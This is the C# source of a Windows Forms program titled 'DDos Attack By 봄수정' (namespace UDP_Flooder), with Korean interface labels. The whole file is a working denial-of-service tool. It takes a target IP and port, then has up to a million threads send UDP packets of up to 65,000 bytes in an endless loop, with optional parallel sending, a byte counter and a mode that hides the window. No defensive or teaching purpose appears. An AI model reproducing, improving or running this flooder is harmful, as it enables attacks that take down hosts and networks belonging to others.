using System;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UDP_Flooder
{
	public class Form1 : Form
	{
		public static int size;

		public static double sizeCount;

		public static bool isEnabled;

		private IContainer components;

		private Button button1;

		private Label label1;

		private TextBox textBox1;

		private TextBox textBox2;

		private Label label2;

		private Label label3;

		private TrackBar trackBar1;

		private Label label4;

		private CheckBox checkBox1;

		private Label label5;

		private NumericUpDown numericUpDown1;

		private Label label6;

		private NumericUpDown numericUpDown2;

		private Label label7;

		private NumericUpDown numericUpDown3;

		private MenuStrip menuStrip1;

		private ToolStripMenuItem settingsToolStripMenuItem;

		private ToolStripMenuItem disappearWhenStartedToolStripMenuItem;

		private NotifyIcon notifyIcon1;

		private ToolStripMenuItem minimiseToTaskbarToolStripMenuItem;

		private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;

		private ToolStripMenuItem toolStripMenuItem2;

		private Label label8;

		private Button button2;

		private ToolStripMenuItem enableByteCounterToolStripMenuItem;

		private TextBox textBox3;

		private ToolStripMenuItem enableMulticoreToolStripMenuItem;

		static Form1()
		{
		}

		public Form1()
		{
			this.InitializeComponent();
			base.MaximizeBox = false;
			this.trackBar1.TickStyle = TickStyle.None;
		}

		private void button1_Click(object sender, EventArgs e)
		{
			this.button1.Text = (Form1.isEnabled ? "Start" : "Stop");
			Form1.isEnabled = !Form1.isEnabled;
			if (Form1.isEnabled)
			{
				if (this.disappearWhenStartedToolStripMenuItem.Checked)
				{
					base.WindowState = FormWindowState.Minimized;
					base.ShowInTaskbar = false;
				}
				Form1.size = this.trackBar1.Value;
				this.init();
			}
		}

		private void button2_Click(object sender, EventArgs e)
		{
			if (!this.enableByteCounterToolStripMenuItem.Checked)
			{
				this.label8.Visible = false;
				this.button2.Visible = false;
				return;
			}
			this.label8.Visible = true;
			this.label8.Text = "Bytes sent: 0";
			Form1.sizeCount = 0;
			this.button2.Visible = true;
		}

		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			TrackBar trackBar = this.trackBar1;
			bool @checked = !this.checkBox1.Checked;
			bool flag = @checked;
			this.textBox3.Enabled = @checked;
			trackBar.Enabled = flag;
		}

		private void contextMenuStrip1_Opened(object sender, EventArgs e)
		{
			Application.Exit();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void Form1_Resize(object sender, EventArgs e)
		{
			if (base.WindowState != FormWindowState.Minimized || !this.minimiseToTaskbarToolStripMenuItem.Checked)
			{
				this.notifyIcon1.Visible = false;
				return;
			}
			this.notifyIcon1.Visible = true;
			base.Hide();
		}

		public void init()
		{
			for (int i = 1; i < this.numericUpDown1.Value && Form1.isEnabled; i++)
			{
				(new Thread(() => this.sock(this.textBox1.Text, Convert.ToInt32(this.textBox2.Text)))).Start();
			}
		}

		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            this.button1 = new System.Windows.Forms.Button();
            this.label1 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.textBox2 = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.trackBar1 = new System.Windows.Forms.TrackBar();
            this.label4 = new System.Windows.Forms.Label();
            this.checkBox1 = new System.Windows.Forms.CheckBox();
            this.label5 = new System.Windows.Forms.Label();
            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
            this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
            this.numericUpDown3 = new System.Windows.Forms.NumericUpDown();
            this.label6 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
            this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.disappearWhenStartedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.minimiseToTaskbarToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.enableByteCounterToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.enableMulticoreToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.label8 = new System.Windows.Forms.Label();
            this.button2 = new System.Windows.Forms.Button();
            this.textBox3 = new System.Windows.Forms.TextBox();
            ((System.ComponentModel.ISupportInitialize)(this.trackBar1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown3)).BeginInit();
            this.menuStrip1.SuspendLayout();
            this.contextMenuStrip1.SuspendLayout();
            this.SuspendLayout();
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(134, 174);
            this.button1.Margin = new System.Windows.Forms.Padding(2);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(163, 46);
            this.button1.TabIndex = 0;
            this.button1.Text = "시작";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(71, 29);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(40, 12);
            this.label1.TabIndex = 1;
            this.label1.Text = "IP주소";
            // 
            // textBox1
            // 
            this.textBox1.Location = new System.Drawing.Point(142, 29);
            this.textBox1.Margin = new System.Windows.Forms.Padding(2);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(156, 21);
            this.textBox1.TabIndex = 2;
            // 
            // textBox2
            // 
            this.textBox2.Location = new System.Drawing.Point(142, 64);
            this.textBox2.Margin = new System.Windows.Forms.Padding(2);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new System.Drawing.Size(73, 21);
            this.textBox2.TabIndex = 3;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(94, 66);
            this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(29, 12);
            this.label2.TabIndex = 4;
            this.label2.Text = "포트";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(21, 94);
            this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(30, 12);
            this.label3.TabIndex = 5;
            this.label3.Text = "Size";
            // 
            // trackBar1
            // 
            this.trackBar1.Location = new System.Drawing.Point(57, 92);
            this.trackBar1.Margin = new System.Windows.Forms.Padding(2);
            this.trackBar1.Maximum = 65000;
            this.trackBar1.Minimum = 1;
            this.trackBar1.Name = "trackBar1";
            this.trackBar1.Size = new System.Drawing.Size(282, 45);
            this.trackBar1.TabIndex = 6;
            this.trackBar1.Value = 1;
            this.trackBar1.Scroll += new System.EventHandler(this.trackBar1_Scroll);
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(382, 113);
            this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(30, 12);
            this.label4.TabIndex = 7;
            this.label4.Text = "Byte";
            // 
            // checkBox1
            // 
            this.checkBox1.AutoSize = true;
            this.checkBox1.Location = new System.Drawing.Point(315, 76);
            this.checkBox1.Margin = new System.Windows.Forms.Padding(2);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new System.Drawing.Size(88, 16);
            this.checkBox1.TabIndex = 8;
            this.checkBox1.Text = "랜덤 사이즈";
            this.checkBox1.UseVisualStyleBackColor = true;
            this.checkBox1.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(24, 133);
            this.label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(52, 12);
            this.label5.TabIndex = 9;
            this.label5.Text = "Threads";
            // 
            // numericUpDown1
            // 
            this.numericUpDown1.Location = new System.Drawing.Point(81, 133);
            this.numericUpDown1.Margin = new System.Windows.Forms.Padding(2);
            this.numericUpDown1.Maximum = new decimal(new int[] {
            1000000,
            0,
            0,
            0});
            this.numericUpDown1.Name = "numericUpDown1";
            this.numericUpDown1.Size = new System.Drawing.Size(48, 21);
            this.numericUpDown1.TabIndex = 10;
            // 
            // numericUpDown2
            // 
            this.numericUpDown2.Location = new System.Drawing.Point(208, 133);
            this.numericUpDown2.Margin = new System.Windows.Forms.Padding(2);
            this.numericUpDown2.Maximum = new decimal(new int[] {
            1410065408,
            2,
            0,
            0});
            this.numericUpDown2.Name = "numericUpDown2";
            this.numericUpDown2.Size = new System.Drawing.Size(42, 21);
            this.numericUpDown2.TabIndex = 12;
            // 
            // numericUpDown3
            // 
            this.numericUpDown3.Location = new System.Drawing.Point(316, 134);
            this.numericUpDown3.Margin = new System.Windows.Forms.Padding(2);
            this.numericUpDown3.Name = "numericUpDown3";
            this.numericUpDown3.Size = new System.Drawing.Size(58, 21);
            this.numericUpDown3.TabIndex = 14;
            this.numericUpDown3.Value = new decimal(new int[] {
            10,
            0,
            0,
            0});
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(138, 134);
            this.label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(69, 12);
            this.label6.TabIndex = 11;
            this.label6.Text = "Delay (ms)";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(263, 136);
            this.label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(47, 12);
            this.label7.TabIndex = 13;
            this.label7.Text = "Actions";
            // 
            // menuStrip1
            // 
            this.menuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.settingsToolStripMenuItem});
            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Padding = new System.Windows.Forms.Padding(5, 1, 0, 1);
            this.menuStrip1.Size = new System.Drawing.Size(431, 24);
            this.menuStrip1.TabIndex = 15;
            this.menuStrip1.Text = "menuStrip1";
            // 
            // settingsToolStripMenuItem
            // 
            this.settingsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.disappearWhenStartedToolStripMenuItem,
            this.minimiseToTaskbarToolStripMenuItem,
            this.enableByteCounterToolStripMenuItem,
            this.enableMulticoreToolStripMenuItem});
            this.settingsToolStripMenuItem.Name = "settingsToolStripMenuItem";
            this.settingsToolStripMenuItem.Size = new System.Drawing.Size(67, 22);
            this.settingsToolStripMenuItem.Text = "설정열기";
            // 
            // disappearWhenStartedToolStripMenuItem
            // 
            this.disappearWhenStartedToolStripMenuItem.CheckOnClick = true;
            this.disappearWhenStartedToolStripMenuItem.Name = "disappearWhenStartedToolStripMenuItem";
            this.disappearWhenStartedToolStripMenuItem.Size = new System.Drawing.Size(194, 22);
            this.disappearWhenStartedToolStripMenuItem.Text = "시작 시 완전히 사라짐";
            this.disappearWhenStartedToolStripMenuItem.ToolTipText = "Overides \"Minimise to toolbar\" when started\r\nYou will have to close it manually w" +
    "ith task manager";
            // 
            // minimiseToTaskbarToolStripMenuItem
            // 
            this.minimiseToTaskbarToolStripMenuItem.CheckOnClick = true;
            this.minimiseToTaskbarToolStripMenuItem.Name = "minimiseToTaskbarToolStripMenuItem";
            this.minimiseToTaskbarToolStripMenuItem.Size = new System.Drawing.Size(194, 22);
            this.minimiseToTaskbarToolStripMenuItem.Text = "작업 표시줄 최소화";
            // 
            // enableByteCounterToolStripMenuItem
            // 
            this.enableByteCounterToolStripMenuItem.CheckOnClick = true;
            this.enableByteCounterToolStripMenuItem.Name = "enableByteCounterToolStripMenuItem";
            this.enableByteCounterToolStripMenuItem.Size = new System.Drawing.Size(194, 22);
            this.enableByteCounterToolStripMenuItem.Text = "바이트 카운터 사용";
            this.enableByteCounterToolStripMenuItem.ToolTipText = "Disabled by default due to lag\r\nWill crash if settings are too high";
            this.enableByteCounterToolStripMenuItem.Click += new System.EventHandler(this.button2_Click);
            // 
            // enableMulticoreToolStripMenuItem
            // 
            this.enableMulticoreToolStripMenuItem.CheckOnClick = true;
            this.enableMulticoreToolStripMenuItem.Name = "enableMulticoreToolStripMenuItem";
            this.enableMulticoreToolStripMenuItem.Size = new System.Drawing.Size(194, 22);
            this.enableMulticoreToolStripMenuItem.Text = "멀티코어 활성화";
            this.enableMulticoreToolStripMenuItem.ToolTipText = "Will take up lots of cpu usage but might be better.";
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.ContextMenuStrip = this.contextMenuStrip1;
            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem2});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(68, 26);
            this.contextMenuStrip1.Opened += new System.EventHandler(this.contextMenuStrip1_Opened);
            // 
            // toolStripMenuItem2
            // 
            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
            this.toolStripMenuItem2.Size = new System.Drawing.Size(67, 22);
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(138, 157);
            this.label8.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(79, 12);
            this.label8.TabIndex = 17;
            this.label8.Text = "Bytes sent: 0";
            this.label8.Visible = false;
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(310, 197);
            this.button2.Margin = new System.Windows.Forms.Padding(2);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(111, 22);
            this.button2.TabIndex = 18;
            this.button2.Text = "카운터 리셋";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Visible = false;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // textBox3
            // 
            this.textBox3.Location = new System.Drawing.Point(339, 94);
            this.textBox3.Margin = new System.Windows.Forms.Padding(2);
            this.textBox3.MaxLength = 5000000;
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new System.Drawing.Size(79, 21);
            this.textBox3.TabIndex = 19;
            this.textBox3.Text = "1";
            this.textBox3.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.textBox3.WordWrap = false;
            this.textBox3.TextChanged += new System.EventHandler(this.textBox3_TextChanged);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 12F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(431, 227);
            this.ContextMenuStrip = this.contextMenuStrip1;
            this.Controls.Add(this.textBox3);
            this.Controls.Add(this.button2);
            this.Controls.Add(this.label8);
            this.Controls.Add(this.numericUpDown3);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.numericUpDown2);
            this.Controls.Add(this.label6);
            this.Controls.Add(this.numericUpDown1);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.checkBox1);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.trackBar1);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.textBox2);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.menuStrip1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MainMenuStrip = this.menuStrip1;
            this.Margin = new System.Windows.Forms.Padding(2);
            this.Name = "Form1";
            this.Text = "DDos Attack By 봄수정";
            this.Resize += new System.EventHandler(this.Form1_Resize);
            ((System.ComponentModel.ISupportInitialize)(this.trackBar1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown3)).EndInit();
            this.menuStrip1.ResumeLayout(false);
            this.menuStrip1.PerformLayout();
            this.contextMenuStrip1.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

		}

		private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			base.Visible = true;
			this.notifyIcon1.Visible = false;
		}

		public int sizegen()
		{
			int num;
			num = (!this.checkBox1.Checked ? Form1.size : (new Random()).Next(1, 65000));
			return num;
		}

		public void sock(string address, int port)
		{
			UdpClient udpClient = new UdpClient(address, port);
			while (Form1.isEnabled)
			{
				byte[] numArray = new byte[this.sizegen()];
				if (this.enableMulticoreToolStripMenuItem.Checked)
				{
					Parallel.For(1, Convert.ToInt32(this.numericUpDown3.Value), (int i) => {
						if (Form1.isEnabled)
						{
							udpClient.Send(numArray, (int)numArray.Length);
							if (this.enableByteCounterToolStripMenuItem.Checked)
							{
								this.label8.Visible = true;
								Form1.sizeCount += (double)((int)numArray.Length);
								this.label8.Text = string.Concat("Bytes sent: ", Form1.sizeCount);
							}
						}
					});
				}
				else
				{
					for (int num = 1; num < this.numericUpDown3.Value; num++)
					{
						if (!Form1.isEnabled)
						{
							goto Label0;
						}
						udpClient.Send(numArray, (int)numArray.Length);
						if (this.enableByteCounterToolStripMenuItem.Checked)
						{
							this.label8.Visible = true;
							Form1.sizeCount += (double)((int)numArray.Length);
							this.label8.Text = string.Concat("Bytes sent: ", Form1.sizeCount);
						}
					}
				}
			Label0:
				Thread.Sleep(Convert.ToInt32(this.numericUpDown2.Value));
			}
		}

		private void textBox3_TextChanged(object sender, EventArgs e)
		{
			this.textBox3.Text = this.textBox3.Text.Replace(" ", string.Empty);
			try
			{
				double num = Convert.ToDouble(this.textBox3.Text);
				if (num < 1)
				{
					this.trackBar1.Value = 1;
					this.textBox3.Text = "1";
				}
				else if (num <= 65000)
				{
					this.trackBar1.Value = Convert.ToInt32(this.textBox3.Text);
				}
				else
				{
					this.trackBar1.Value = 65000;
					this.textBox3.Text = "65000";
				}
				this.label4.Text = (Convert.ToInt32(this.textBox3.Text) != 1 ? "Bytes" : "Byte");
			}
			catch
			{
				if (this.textBox3.Text != "")
				{
					this.trackBar1.Value = 1;
					this.textBox3.Text = "1";
					this.label4.Text = "Byte";
				}
			}
		}

		private void trackBar1_Scroll(object sender, EventArgs e)
		{
			this.label4.Text = (this.trackBar1.Value != 1 ? "Bytes" : "Byte");
			this.textBox3.Text = this.trackBar1.Value.ToString();
		}
	}
}